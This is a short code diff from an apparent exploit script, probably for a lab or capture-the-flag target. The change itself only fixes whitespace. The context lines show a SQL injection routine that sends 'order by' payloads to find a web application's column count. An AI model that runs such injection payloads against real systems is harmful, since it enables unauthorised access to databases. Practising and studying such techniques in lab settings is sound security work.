@@ -12,7 +12,7 @@ def exploit(url):
         payload = f"'+order+by+{i}--+-"
         request = requests.get(url + uri + payload, verify=False, proxies=proxies)
         response = request.text
-        if "Internal Server Error" in  response:
+        if "Internal Server Error" in response:
             return (i - 1)
     return False
 
